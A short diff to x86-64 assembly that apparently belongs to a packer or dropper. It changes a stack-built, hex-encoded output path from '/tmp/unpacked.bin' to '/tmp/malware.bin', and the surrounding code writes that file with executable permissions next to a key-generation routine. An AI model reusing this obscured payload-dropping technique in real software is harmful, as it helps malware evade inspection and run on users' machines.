@@ -23,11 +23,10 @@ _start:
     # je _exit
 
     # write to disk instead
-    mov $0x6e, %rsi
+    pushq $0
+    mov $0x6e69622e65726177, %rsi
     push %rsi
-    mov $0x69622e64656b6361, %rsi
-    push %rsi
-    mov $0x706e752f706d742f, %rsi
+    mov $0x6c616d2f706d742f, %rsi
     push %rsi
     mov %rsp, %rdi
     mov $448, %rsi # S_IRWXU
@@ -71,11 +70,10 @@ _start:
     syscall
 
 
-    mov $0x6e, %rsi
+    pushq $0
+    mov $0x6e69622e65726177, %rsi
     push %rsi
-    mov $0x69622e64656b6361, %rsi
-    push %rsi
-    mov $0x706e752f706d742f, %rsi
+    mov $0x6c616d2f706d742f, %rsi
     push %rsi
     mov %rsp, %rdi
     xor %rsi, %rsi
@@ -193,4 +191,3 @@ _generate_key:
     nop
     nop
     nop
-    
